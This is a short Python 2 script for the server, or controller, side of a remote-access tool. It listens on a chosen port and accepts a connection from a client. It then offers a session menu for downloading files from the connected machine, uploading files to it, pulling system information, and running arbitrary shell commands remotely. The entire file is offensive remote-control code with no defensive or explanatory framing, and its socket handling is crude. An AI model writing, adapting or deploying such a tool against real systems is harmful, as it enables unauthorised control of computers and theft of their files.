from socket import *

ip = raw_input("ip address = ")
port = raw_input("port = ")

s=socket(AF_INET ,SOCK_STREAM)
s.bind((ip , int(port)))
s.listen(5)

print "\n[*] Server Runing On port "+str(port)+"...\n"

client , addr = s.accept()

print "Open Session 1 From "+str(addr)+'\n'

help_ = """
		1- download
		2- upload
		3- sysinfo

		[ enter command => shell ] 

"""
print help_
print

while True:

	shell = raw_input("Session> ")

	if shell == None or shell == '' or shell == '\n':
		continue

	elif shell == '1': # download

		client.sendall(shell)
		name = raw_input("file name = ")
		client.sendall(name)
		file = open(name , "wb") # write binary
		data = client.recv(1024)
		client.sendall("Recved len data")
		my_write = str(client.recv(int(data)))
		file.write(my_write)
		file.close()
		print 

	elif shell == '2': # upload

		client.sendall(shell)
		name = raw_input("file name = ")
		client.sendall(name)
		file = open(name , "rb")
		data = buffer(file.read())
		client.sendall(str(len(data)))
		print client.recv(1024)
		client.sendall(data)
		file.close()
		print 

	elif shell == '3': # sysinfo

		client.sendall(shell)
		sys = client.recv(34464)
		print
		print sys
		print 

	else: # cmd

		client.sendall(shell)

		cmd = client.recv(93454432)

		print cmd
		print 


client.close()


